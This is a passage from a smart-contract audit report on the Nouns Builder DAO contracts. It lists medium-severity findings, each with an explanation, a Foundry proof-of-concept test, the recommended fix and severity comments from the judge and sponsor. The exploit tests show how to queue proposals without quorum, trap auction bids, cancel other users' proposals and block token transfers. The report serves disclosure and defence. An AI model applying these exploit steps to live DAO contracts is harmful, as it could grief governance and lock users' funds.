vetoed:\n        } else if (proposal.vetoed) {\n            return ProposalState.Vetoed;\n\n            // Else if voting has not started:\n        } else if (block.timestamp < proposal.voteStart) {\n            return ProposalState.Pending;\n\n            // Else if voting has not ended:\n        } else if (block.timestamp < proposal.voteEnd) {\n            return ProposalState.Active;\n\n            // Else if the proposal failed (outvoted OR didn't reach quorum):\n        } else if (proposal.forVotes < proposal.againstVotes || proposal.forVotes < proposal.quorumVotes) {\n            return ProposalState.Defeated;\n\n            // Else if the proposal has not been queued:\n        } else if (settings.treasury.timestamp(_proposalId) == 0) {\n            return ProposalState.Succeeded;\n\n            // Else if the proposal can no longer be executed:\n        } else if (settings.treasury.isExpired(_proposalId)) {\n            return ProposalState.Expired;\n\n            // Else the proposal is queued\n        } else {\n            return ProposalState.Queued;\n        }\n    }\n```\n\n### Proof of Concept\n\nPlease append the following test in `test\\Gov.t.sol`. This test will pass to demonstrate the described scenario.\n\n```solidity\n    function test_QueueProposalWithZeroQuorumVotes() public {\n        mintVoter1();\n\n        (address[] memory targets, uint256[] memory values, bytes[] memory calldatas) = mockProposal();\n\n        bytes32 descriptionHash = keccak256(bytes(\"test\"));\n\n        vm.warp(1 days);\n\n        // token supply is only 4 at this moment\n        assertEq(token.totalSupply(), 4);\n\n        // the calculated quorum votes is 0 because the token supply is low\n        assertEq((token.totalSupply() * governor.quorumThresholdBps()) / 10_000, 0);\n\n        // voter1 creates the proposal\n        vm.prank(voter1);\n        governor.propose(targets, values, calldatas, \"test\");\n\n        bytes32 proposalId = governor.hashProposal(targets, values, calldatas, descriptionHash);\n\n        vm.warp(block.timestamp + governor.votingDelay());\n\n        vm.prank(voter1);\n        governor.castVote(proposalId, 1);\n\n        vm.warp(block.timestamp + governor.votingPeriod());\n\n        // quorum votes corresponding to the proposal is 0\n        Proposal memory proposal = governor.getProposal(proposalId);\n        assertEq(proposal.quorumVotes, 0);\n\n        // the proposal is succeeded\n        assertEq(uint256(governor.state(proposalId)), uint256(ProposalState.Succeeded));\n\n        // voter1 is able to queue the proposal\n        vm.prank(voter1);\n        governor.queue(proposalId);\n        assertEq(uint256(governor.state(proposalId)), uint256(ProposalState.Queued));\n    }\n```\n\n### Tools Used\n\nVSCode\n\n### Recommended Mitigation Steps\n\nA minimum quorum votes governance configuration that is at least 1 can be added. When `quorum()` returns 0 because the token supply is low, calling `propose` could set `proposal.quorumVotes` to the minimum quorum votes.\n\n**[Alex the Entreprenerd (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/607#issuecomment-1252939738):**\n > Because rounding is determined by a mixture of `totalSupply` and `quorumThresholdBps` I believe the finding cannot be of high severity.\n> \n> It is important to note that because totalSupply can be zero, especially if founders take no founder mint, the Governor contract may be griefed, for example by giving away allowances to setup for a future rug-pull.\n> \n> Because the finding can cause a loss, and the code doesn't have specific ways to avoid that (e.g. minimum totalSupply) i believe Medium Severity to be appropriate\n\n**[tbtstl (Nouns Builder) acknowledged and commented](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/607#issuecomment-1259925381):**\n > I think we're going to have to ACK this and move on – there's no clear minimum token requirement we can set at the beginning of a DAO lifecycle that couldn't be circumvented by the malicious user buying the first _n_ tokens. \n> \n> Situations like this will have to be handled by the DAOs vetoer until a quorum is deemed high enough.\n\n\n\n***\n\n## [[M-02] Highest bid in first auction can get irretrievably stuck in the protocol](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/376)\n_Submitted by PwnPatrol, also found by davidbrai, MiloTruck, and pauliax_\n\n[Auction.sol#L248-L254](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/auction/Auction.sol#L248-L254)<br>\n\nIf the first auction is paused and unpaused in a protocol deployed with no founder fees, the highest bid (as well as the first NFT), will get stuck in the protocol with no ability to retrieve either of them.\n\n### Proof of Concept\n\nIn a protocol with founder ownership percentage set to 0, the first tokenId put to auction is #0.\n\nIf the first auction in such a protocol is paused and unpaused, the check for `if (auction.tokenId == 0)` will pass and `_createAuction()` will automatically be called, minting the next token and starting a new auction based on token #1.\n\nThe result is that `highestBid` and `highestBidder` are reset, the first auction is never settled, and the highest bid (as well as NFT #0) will remain stuck in the platform.\n\nThe following test confirms this finding:\n\n```solidity\nfunction test_PauseAndUnpauseInFirstAuction() public {\n    address bidder1 = vm.addr(0xB1);\n    address bidder2 = vm.addr(0xB2);\n\n    vm.deal(bidder1, 100 ether);\n    vm.deal(bidder2, 100 ether);\n\n    console.log(\"Deploying with no founder pct...\");\n    deployMockWithEmptyFounders();\n\n    console.log(\"Unpausing...\");\n    vm.prank(founder);\n    auction.unpause();\n\n    console.log(\"Bidder makes initial bid.\");\n    vm.prank(bidder1);\n    auction.createBid{ value: 1 ether }(0);\n    (uint256 tokenId_, uint256 highestBid_, address highestBidder_,,,) = auction.auction();\n    console.log(\"Currently bidding for ID \", tokenId_);\n    console.log(\"Highest Bid: \", highestBid_, \". Bidder: \", highestBidder_);\n    console.log(\"Contract Balance: \", address(auction).balance);\n    console.log(\"--------\");\n\n    console.log(\"Pausing and unpausing auction house...\");\n    vm.startPrank(address(treasury));\n    auction.pause();\n    auction.unpause();\n    vm.stopPrank();\n\n    console.log(\"Bidder makes new bid.\");\n    vm.prank(bidder2);\n    auction.createBid{ value: 0.5 ether }(1);\n    (uint256 tokenId2_, uint256 highestBid2_, address highestBidder2_,,,) = auction.auction();\n    console.log(\"Currently bidding for ID \", tokenId2_);\n    console.log(\"Highest Bid: \", highestBid2_, \". Bidder: \", highestBidder2_);\n    console.log(\"Contract Balance: \", address(auction).balance);\n```\n\n### Tools Used\n\nManual Review, Foundry\n\n### Recommended Mitigation Steps\n\nRemove the block in `unpause()` that transfers ownership and creates an auction if `auction.tokenId == 0` and trigger those actions manually in the deployment flow.\n\n**[Alex the Entreprenerd (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/376#issuecomment-1257253787):**\n > The warden has shown how, due to a specific set of circumstances, which can happen exclusively during the first auction:\n> \n> - If the first auction has a paying user\n> - The id is 0 (not minted to owner)\n> - And it get's paused\n> \n> Then on restart the highestBidder will lose their ETH as well as not receive the NFT.\n> \n> A more appropriate behaviour would be to force settle if a bid was there, or to handle token0 like any other.\n> \n> Because of the conditionality of the finding, Medium Severity is appropriate.\n> \n> Minting the first token to a founder or settling before unpausing will avoid this.\n\n**[iainnash (Nouns Builder) confirmed](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/376)**\n\n\n\n***\n\n## [[M-03] `Token:mint`: infinite loop if the founders' shares sum up to 100](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/347)\n_Submitted by zzzitron, also found by 0xSmartContract, ChristianKuri, davidbrai, elad, ElKu, hansfriese, immeas, ladboy233, Lambda, MiloTruck, scaraven, tonisives, and volky_\n\n[Token.sol#L179](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/Token.sol#L179)<br>\n\nThe Token as well as Auction cannot be used if the sum of `ownershipPct` is 100\n\n### Proof of Concept\n\n```solidity\n    function test_poc_mintforever() public {\n        createUsers(2, 1 ether);\n\n        address[] memory wallets = new address[](2);\n        uint256[] memory percents = new uint256[](2);\n        uint256[] memory vestExpirys = new uint256[](2);\n\n        uint256 pct = 50;\n        uint256 end = 4 weeks;\n\n        unchecked {\n            for (uint256 i; i < 2; ++i) {\n                wallets[i] = otherUsers[i];\n                percents[i] = pct;\n                vestExpirys[i] = end;\n            }\n        }\n\n        deployWithCustomFounders(wallets, percents, vestExpirys);\n\n        assertEq(token.totalFounders(), 2);\n        assertEq(token.totalFounderOwnership(), 100);\n\n        Founder memory founder;\n\n        unchecked {\n            for (uint256 i; i < 100; ++i) {\n                founder = token.getScheduledRecipient(i);\n\n                if (i % 2 == 0) assertEq(founder.wallet, otherUsers[0]);\n                else assertEq(founder.wallet, otherUsers[1]);\n            }\n        }\n\n// // commented out as it will not stop\n//         vm.prank(otherUsers[0]);\n//         auction.unpause();\n\n    }\n```\n\nIn the proof of concept, there are two founders and they both share 50% of ownership. If the `Auction` should be `unpause`d, and therefore triggers to mint tokens, it will go into the infinite loop and eventually revert for out of gas.\n\n```solidity\n// Token.sol\n\n143     function mint() external nonReentrant returns (uint256 tokenId) {\n144         // Cache the auction address\n145         address minter = settings.auction;\n146\n147         // Ensure the caller is the auction\n148         if (msg.sender != minter) revert ONLY_AUCTION();\n149\n150         // Cannot realistically overflow\n151         unchecked {\n152             do {\n153                 // Get the next token to mint\n154                 tokenId = settings.totalSupply++;\n155\n156                 // Lookup whether the token is for a founder, and mint accordingly if so\n157             } while (_isForFounder(tokenId));\n158         }\n159\n160         // Mint the next available token to the auction house for bidding\n161         _mint(minter, tokenId);\n162     }\n\n177     function _isForFounder(uint256 _tokenId) private returns (bool) {\n178         // Get the base token id\n179         uint256 baseTokenId = _tokenId % 100;\n180\n181         // If there is no scheduled recipient:\n182         if (tokenRecipient[baseTokenId].wallet == address(0)) {\n183             return false;\n184\n185             // Else if the founder is still vesting:\n186         } else if (block.timestamp < tokenRecipient[baseTokenId].vestExpiry) {\n187             // Mint the token to the founder\n188             _mint(tokenRecipient[baseTokenId].wallet, _tokenId);\n189\n190             return true;\n191\n192             // Else the founder has finished vesting:\n193         } else {\n194             // Remove them from future lookups\n195             delete tokenRecipient[baseTokenId];\n196\n197             return false;\n198         }\n199     }\n```\n\nIn the `Token::mint`, there is a while loop which will keep looping as long as `_isForFounder` returns true. The `_isForFounder` function will return true is the given `_tokenId`'s recipient is still vesting. However, to check the recipient it is checking the `baseTokenId` which is `_tokenId % 100` (in line 179 above snippet). Which means, if the `tokenRecipient` of 0 to 99 are currently vesting, it will keep returning true and the while loop in the `mint` function will not stop. The `tokenRecipient` was set in the `_addFounders` and if the sum of all founders' ownership percent is 100, the `tokenRecipient` will be filled up to 100.\n\n### Recommended Mitigation Steps\n\nUse `_tokenId` instead of `baseTokenId`.\n\n**[Alex the Entreprenerd (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/347#issuecomment-1257264768):**\n > While a different typo may have allow to support more than 100 founders and shares setup, the following check:\n> [Token.sol#L179-L180](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/Token.sol#L179-L180)\n> \n> ```solidity\n>         uint256 baseTokenId = _tokenId % 100;\n> \n> ```\n> \n> Will cause each id to be check against the first 100, meaning that if the owners own 100% of all first 100 ids (e.g. the [`schedule`](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/Token.sol#L102-L103) value is 1, the code will loop forever in this [while loop](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/Token.sol#L157-L158) as no new ID is available\n>\n> Because this is contingent on setting admin ownership to 100%, I think Medium Severity to be more appropriate. I wonder if 100% ownership for founders is rational in any case, as no auction would ever happen, however the configuration is allowed and it will brick the contracts.\n\n**[iainnash (Nouns Builder) confirmed](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/347)**\n\n\n\n***\n\n## [[M-04] Founders can receive less tokens that expected](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/269)\n*Submitted by MEP, also found by &#95;&#95;141345&#95;&#95;, 0xSky, antonttc, azephiar, cccz, CertoraInc, d3e4, datapunk, davidbrai, easy&#95;peasy, hansfriese, hansfriese, MiloTruck, minhtrng, neumo, pcarranzav, peritoflores, PwnPatrol, R2, scaraven, teawaterwire, Tointer, tonisives, unforgiven, V&#95;B, wagmi, zkhorse, and zzzitron*\n\n[Token.sol#L118](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/Token.sol#L118)<br>\n\nBecause the IDs of the founders tokens are wrongly computed, some of them can have an id higher than 100 and then never be minted.\n\n### Proof of Concept\n\nIf a founder has percentage of `pct`, then `pct` IDs between 0 and 99 should be given to him in the mapping `tokenRecipient`, such that if a token is minted with `tokenId % 100` equal to one of its IDs, it is minted directly to him. But the modulo is not correctly done at when the mapping is filled, so some IDs of a founder can be higher than 100.\n\nIt happens for example if Alice has 10% and Bob gas 11%. For Alice, `schedule` is equal to 10, so Alices will have the ids 0, 10, 20, ..., 90. But for Bob, `schedule` is also equal to 9. So it will have the ids 1, 11, 21, ..., 91, 100. Indeed, Bob can't have the ID 0 because it belongs to Alice, same for the ID 10 etc. The last eleventh ID that is given to Bob is 100, that can't be reached.\n\nThis happens for example when with two founders the percentages verify `(100 / pct1) - (100 / pct2) == 1`. So (11%, 12%) or (25%, 33%) will behave samely (with more token lost in some case).\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.15;\n\nimport { TokenTest } from \"./Token.t.sol\";\n\ncontract TestMEP_M1 is TokenTest {\n\n    function setUpMEP() internal returns (address alice, address bob, uint256 totalOwnership) {\n        address[] memory wallets = new address[](2);\n        uint256[] memory percents = new uint256[](2);\n        uint256[] memory vestExpiries = new uint256[](2);\n\n        wallets[0] = alice = address(0x0a);\n        wallets[1] = bob = address(0x0b);\n\n        percents[0] = 10;\n        percents[1] = 11;\n        totalOwnership = percents[0] + percents[1];\n\n        vestExpiries[0] = type(uint256).max;\n        vestExpiries[1] = type(uint256).max;\n\n        deployWithCustomFounders(wallets, percents, vestExpiries);\n    }\n\n    // Verifies it on the 100 first tokens\n    function testMEP_M1_1() public {\n\n        (address alice, address bob, uint256 totalOwnership) = setUpMEP();\n\n        // Should mint the 100 first tokens\n        // Alice should receive 10 tokens\n        // Bob should receive 11 tokens\n        for (uint256 i; i < 100 - totalOwnership; ++i) {\n            vm.prank(address(auction));\n            token.mint();\n        }\n\n        assertEq(token.balanceOf(alice), 10, \"Alice's balance is wrong\");\n        assertEq(token.balanceOf(bob), 11, \"Bob's balance is wrong\");\n    }\n\n    // Verifies it with the law of large numbers\n    function testMEP_M1_2() public {\n\n        (address alice, address bob, ) = setUpMEP();\n\n        uint256 tokensToMint = 123456; // enough large to apply the law of large numbers\n        for (uint256 i; i < tokensToMint; ++i) {\n            vm.prank(address(auction));\n            token.mint();\n        }\n\n        uint256 totalSupply = token.totalSupply();\n        assertEq(token.balanceOf(alice) * 100 / totalSupply, 10, \"Alice's percentage is wrong\");\n        assertEq(token.balanceOf(bob) * 100 / totalSupply, 11, \"Bob's percentage is wrong\");\n    }\n}\n\n```\n\n### Recommended Mitigation Steps\n\nReplace the line 118 of `Token.sol` by `baseTokenId = (baseTokenId + schedule) % 100;`.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/269#issuecomment-1257268896):**\n > The warden has shown how, due to a logical mistake / typo, founders will receive a lower allocation than expected.\n> \n> This is contingent on certain allocations being set and will cause a \"loss of yield\" to the founders estimated to the lost allocation.\n> \n> I believe the finding could be raised to High Severity due to the graveness of it, however, because it is contingent on specific inputs, I think Medium Severity to be appropriate\n\n**[tbtstl (Nouns Builder) disagreed with severity and commented](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/269#issuecomment-1258518341):**\n > I actually think this one should be high severity – it's important that these token ownership percentages end up consistent on a long enough time scale.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/269#issuecomment-1261623943):**\n > I appreciate the generosity of the sponsor, ultimately the bug can happen only if `(baseTokenId + schedule)` is greater than 100, which, because the schedule is X / 100, will not always happen, and the loss will not be total but only for the specific tokens for which the modulo is necessary.\n> \n> For those reasons (conditionality of bug due to admin input), I think Medium Severity to be more appropriate.\n> \n> I do recommend mitigation nonetheless.\n\n\n\n***\n\n## [[M-05] A proposal can be cancelled by anyone if the proposal has exactly proposalThreshold votes](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/194)\n*Submitted by davidbrai, also found by cccz, Ch\\_301, Chom, datapunk, elad, GimelSec, pauliax, PwnPatrol, and rbserver*\n\n<https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L128><br>\n<https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L363>\n\nIf the proposer of a proposal has votes in the same amount as the proposalThreshold, they can create a proposal. But in this case, anyone can also cancel this proposal.\n\nWhen creating a proposal the requirement is \"Ensure the caller's voting weight is greater than or equal to the threshold\".<br>\nWhen cancelling a proposal the check is:<br>\nif `getVotes(proposal.proposer, block.timestamp - 1) > proposal.proposalThreshold` then it the cancelling is not allowed. In effect, if the number of votes is lower than *or equal* to the proposalThreshold it can be cancelled.\n\nIn the extreme case where all the DAO members have no more than the proposalThreshold amount of votes, every proposal can be cancelled.\n\n### Proof of Concept\n\nThe forge test below demonstrates the issue:\n\n    // SPDX-License-Identifier: MIT\n    pragma solidity 0.8.15;\n\n    import \"forge-std/console.sol\";\n    import { NounsBuilderTest } from \"../utils/NounsBuilderTest.sol\";\n\n    import { IManager } from \"../../src/manager/IManager.sol\";\n    import { IGovernor } from \"../../src/governance/governor/IGovernor.sol\";\n    import { GovernorTypesV1 } from \"../../src/governance/governor/types/GovernorTypesV1.sol\";\n\n    contract GovCancelWrongCheckTest is NounsBuilderTest, GovernorTypesV1 {\n        uint256 internal constant AGAINST = 0;\n        uint256 internal constant FOR = 1;\n        uint256 internal constant ABSTAIN = 2;\n        uint256 proposalThresholdBps = 100;\n\n        address internal voter1 = address(0x1234);\n        address internal randomUser = address(0x8888);\n\n        function setUp() public virtual override {\n            super.setUp();\n\n            deployMock();\n        }\n\n        function testCanCancelProposalIfExactThreshold() public {\n            // mint a few tokens\n            for (uint256 i; i < 85; i++) {\n                vm.prank(address(auction));\n                token.mint();\n            }\n            assertEq(token.totalSupply(), 100);\n\n            // transfer one token to voter1\n            vm.prank(address(auction));\n            token.transferFrom(address(auction), voter1, 5);\n            assertEq(token.balanceOf(voter1), 1);\n\n            // make sure voter has enough votes\n            assertEq(governor.proposalThreshold(), 1);\n            assertEq(token.getVotes(voter1), 1);\n\n            vm.warp(block.timestamp + 1);\n\n            // propose\n            (address[] memory targets, uint256[] memory values, bytes[] memory calldatas) = mockProposal();\n            vm.prank(voter1);\n            bytes32 proposalId = governor.propose(targets, values, calldatas, \"test\");\n\n            // Proposal created successfully\n            assertEq(uint256(governor.state(proposalId)), uint256(ProposalState.Pending));\n\n            // Cancel proposal\n            vm.prank(randomUser);\n            governor.cancel(proposalId);\n            assertEq(uint256(governor.state(proposalId)), uint256(ProposalState.Canceled));\n        }\n\n        function setMockGovParams() internal virtual override {\n            setGovParams(2 days, 1 seconds, 1 weeks, proposalThresholdBps, 1000);\n        }\n\n        function mockProposal()\n            internal\n            view\n            returns (\n                address[] memory targets,\n                uint256[] memory values,\n                bytes[] memory calldatas\n            )\n        {\n            targets = new address[](1);\n            values = new uint256[](1);\n            calldatas = new bytes[](1);\n\n            targets[0] = address(auction);\n            calldatas[0] = abi.encodeWithSignature(\"pause()\");\n        }\n    }\n\n### Recommended Mitigation Steps\n\nChange the check in `cancel` to match the requirement in `propose`;<br>\nchange line 363 in Governor.sol to:<br>\n`if (msg.sender != proposal.proposer && getVotes(proposal.proposer, block.timestamp - 1) >= proposal.proposalThreshold)`\n\n**[Alex the Entreprenerd (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/194#issuecomment-1257270340):**\n > Because we know that a cancelled proposal cannot be repeated, and because the protocol is aiming at auctioning out NFTs that are unitary, rare, \"small print\" if you will, then 1 vote may be considered more heavily than in other situations. (e.g. 1 second is still just 1 second, but 1 token here could be 10s if not hundreds of thousands of dollars)\n> \n> Not only that, due to the [following check](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/governor/Governor.sol#L363), the proposer must maintain the current balance above the threshold (instead of it being the balance at time of proposal).\n> \n> For those reasons, I think this is a medium severity finding.\n\n**[kulkarohan (Nouns Builder) confirmed, but disagreed with severity](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/194)**\n\n\n\n***\n\n## [[M-06] Proposals can be bricked and Auctions stalled by bad settings](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/482)\n_Submitted by chatch, also found by 0x4non, ak1, ayeslick, Chom, fatherOfBlocks, hyh, R2, rvierdiiev, scaraven, simon135, and zzzitron_\n\n[Governor.sol#L588](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L588)<br>\n\nThe protocol assumes founders and proposals will set sane settings. However there are some settings that if set incorrectly will block proposals from being created or succeeding and block auctions from completing.\n\nThis vulnerability has a low likelihood of occurrence as the outcome is not in the interest of the community. However the possibility exists if there is some misunderstanding or miscalculation. If a bad setting is allowed the impact is high.\n\n### Proof of Concept\n\n#### Bricking governance proposals\n\n**Governor settings.quorumThresholdBps > 10\\_000**\n\nIf `quorumThresholdBps` is set above 10\\_000 then it would be impossible to get enough votes to succeed.\n\nWithout being able to execute a proposal the setting itself could never be fixed.\n\n**Governor settings.proposalThresholdBps > 10\\_000**\n\nIf `proposalThresholdBps` is set above 10\\_000 then it would be impossible to submit a proposal.\n\nWithout being able to submit a proposal the setting itself could never be fixed.\n\n#### Stalling a governance proposal\n\n**Treasury settings.delay**\n\nA very large value for `delay` would prevent a proposal from being executed.\n\nFor example 1000 years easily fits into `delay` and would result in a 1000 year wait before being able to execute.\n\nA governance proposal could fix this property for future proposals but any proposal created with the large `delay` would remain stuck.\n\n#### Stalling the auction\n\n**Auction settings.duration**\n\nThe `duration` value is in seconds and any value up to type(uint40).max is permitted.\n\nThat is `1099511627775` seconds which is > 48000 years.\n\nA large value like this would stop the auction from ever ending and thus stop new NFTs from being minted.\n\nA governance proposal could fix this setting but ideally a very large `duration` would be blocked.\n\n**Auction settings.timeBuffer**\n\nSimilar to duration but applies to the auction endTime extention.\n\nSo the auction could be extended a number of years for example.\n\n### Recommended Mitigation Steps\n\nImplement reasonable range bounds reverting where appropriate. In particular for the above apply:\n\n*   Governor settings `quorumThresholdBps` <= 10\\_000\n*   Governor settings `proposalThresholdBps` <= 10\\_000\n*   Treasury settings `delay` <= 6 months\n*   Auction settings `duration` <= 6 months\n*   Auction settings `timeBuffer` <= 6 months\n\nAdd these checks to the `initialize()` functions and in the setter / update functions where these individual settings properties can be updated.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/482#issuecomment-1249935989):**\n > Lack of validation looks right, not convinced about severity if behind timelock.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/482#issuecomment-1257273463):**\n > The warden has shown how, due to a lack of rational minimums and maximums, governance can be griefed if not effectively bricked.\n> \n> Because this is contingent on allowing \"irrational\" values, I agree with Medium Severity.\n> \n> Mitigation would require adding acceptable minimums and maximums, or forcing the deployer to set those in a rational way that is transparent to end users.\n\n**[iainnash (Nouns Builder) confirmed](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/482)**\n\n\n\n***\n\n## [[M-07] NFT owner can block token burning and transfer by delegating to zero address](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/478)\n_Submitted by hyh_\n\nERC721Votes's delegate() and delegateBySig() allow the delegation to zero address, which result in owner's votes elimination in the checkpoint. I.e. the votes are subtracted from the owner, but aren't added anywhere. \\_moveDelegateVotes() invoked by \\_delegate() treats the corresponding call as a burning, erasing the votes.\n\nThe impact is that the further transfer and burning attempts for the ids of the owner will be reverted because \\_afterTokenTransfer() callback will try to reduce owner's votes, which are already zero, reverting the calls due to subtraction fail.\n\nAs ERC721Votes is parent to Token the overall impact is governance token burning and transfer being disabled whenever the owner delegated to zero address. This can be done deliberately, i.e. any owner can disable burning and transfer of the owned ids at any moment, which can interfere with governance voting process.\n\n### Proof of Concept\n\nUser facing delegate() and delegateBySig() allow for zero address delegation:\n\n<https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L131-L135>\n\n```solidity\n    /// @notice Delegates votes to an account\n    /// @param _to The address delegating votes to\n    function delegate(address _to) external {\n        _delegate(msg.sender, _to);\n    }\n```\n\n<https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L144-L174>\n\n```solidity\n    function delegateBySig(\n        address _from,\n        address _to,\n        uint256 _deadline,\n        uint8 _v,\n        bytes32 _r,\n        bytes32 _s\n    ) external {\n        // Ensure the signature has not expired\n        if (block.timestamp > _deadline) revert EXPIRED_SIGNATURE();\n\n        // Used to store the digest\n        bytes32 digest;\n\n        // Cannot realistically overflow\n        unchecked {\n            // Compute the hash of the domain seperator with the typed delegation data\n            digest = keccak256(\n                abi.encodePacked(\"\\x19\\x01\", DOMAIN_SEPARATOR(), keccak256(abi.encode(DELEGATION_TYPEHASH, _from, _to, nonces[_from]++, _deadline)))\n            );\n        }\n\n        // Recover the message signer\n        address recoveredAddress = ecrecover(digest, _v, _r, _s);\n\n        // Ensure the recovered signer is the voter\n        if (recoveredAddress == address(0) || recoveredAddress != _from) revert INVALID_SIGNATURE();\n\n        // Update the delegate\n        _delegate(_from, _to);\n    }\n```\n\nAnd pass zero address to the \\_delegate() where it is being set:\n\n<https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L179-L190>\n\n```solidity\n    function _delegate(address _from, address _to) internal {\n        // Get the previous delegate\n        address prevDelegate = delegation[_from];\n\n        // Store the new delegate\n        delegation[_from] = _to;\n\n        emit DelegateChanged(_from, prevDelegate, _to);\n\n        // Transfer voting weight from the previous delegate to the new delegate\n        _moveDelegateVotes(prevDelegate, _to, balanceOf(_from));\n    }\n```\n\nIn this case \\_moveDelegateVotes() will reduce the votes from the owner, not adding it to anywhere as `_from` is the owner, while `_to` is zero address:\n\n<https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L203-L220>\n\n```solidity\n            if (_from != _to && _amount > 0) {\n                // If this isn't a token mint:\n                if (_from != address(0)) {\n                    // Get the sender's number of checkpoints\n                    uint256 nCheckpoints = numCheckpoints[_from]++;\n\n                    // Used to store the sender's previous voting weight\n                    uint256 prevTotalVotes;\n\n                    // If this isn't the sender's first checkpoint: Get their previous voting weight\n                    if (nCheckpoints != 0) prevTotalVotes = checkpoints[_from][nCheckpoints - 1].votes;\n\n                    // Update their voting weight\n                    _writeCheckpoint(_from, nCheckpoints, prevTotalVotes, prevTotalVotes - _amount);\n                }\n\n                // If this isn't a token burn:\n                if (_to != address(0)) { // @ audit here we add the votes to the target, but only if it's not zero address\n```\n\nThe owner might know that and can use such a delegation to interfere with the system by prohibiting of transferring/burning of his ids.\n\nThis happens via \\_afterTokenTransfer() reverting as it's becomes impossible to reduce owner's votes balance by `1`:\n\n<https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L262-L271>\n\n```solidity\n    function _afterTokenTransfer(\n        address _from,\n        address _to,\n        uint256 _tokenId\n    ) internal override {\n        // Transfer 1 vote from the sender to the recipient\n        _moveDelegateVotes(_from, _to, 1);\n\n        super._afterTokenTransfer(_from, _to, _tokenId);\n    }\n```\n\n### Recommended Mitigation Steps\n\nConsider prohibiting zero address as a delegation destination:\n\n<https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L179-L190>\n\n```solidity\n    function _delegate(address _from, address _to) internal {\n+\t\tif (_to == address(0)) revert INVALID_SIGNATURE();\n\n        // Get the previous delegate\n        address prevDelegate = delegation[_from];\n\n        // Store the new delegate\n        delegation[_from] = _to;\n\n        emit DelegateChanged(_from, prevDelegate, _to);\n\n        // Transfer voting weight from the previous delegate to the new delegate\n        _moveDelegateVotes(prevDelegate, _to, balanceOf(_from));\n    }\n```\n\nWhen `_to` isn't zero there always be an addition in \\_moveDelegateVotes(), so the system votes balance will be sustained.\n\n**[Alex the Entreprenerd (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/478#issuecomment-1257279353):**\n > From [`Auction`](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/auction/Auction.sol#L197-L198) we know that token Burning will happen only on failure to complete the auction.\n> \n> While a new mechanism for burning could be added, it would require changing the code via an upgrade (conditional).\n> \n> The Warden has proven how underflow will cause the inability to transfer the token permanently and irreversibly.\n> \n> Delegating to 0, will cause Delegation to no longer be available (see other reports), however this finding also shows how Delegating to Address(0) causes the token to no longer being transferable.\n> \n> I think the submission is well developed, however it requires the owner to delegate to the address(0).\n> \n> For that reason, I think the finding is of Medium Severity.\n>\n> Because this is the only report that shows loss of Token, am not going to bulk with the others which instead show how Voting Power is lost irreversibly.\n\n**[iainnash (Nouns Builder) confirmed and commented](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/478#issuecomment-1258617084):**\n > Logical duplicate of [#478](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/478) but agree with @Alex the Entreprenerd about the reference being to lost token(s) being valid.\n\n\n\n***\n\n## [[M-08] Delegation should not be allowed to address(0)](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/203)\n*Submitted by davidbrai, also found by bin2chen, Ch\\_301, Chom, cryptphi, pashov, and 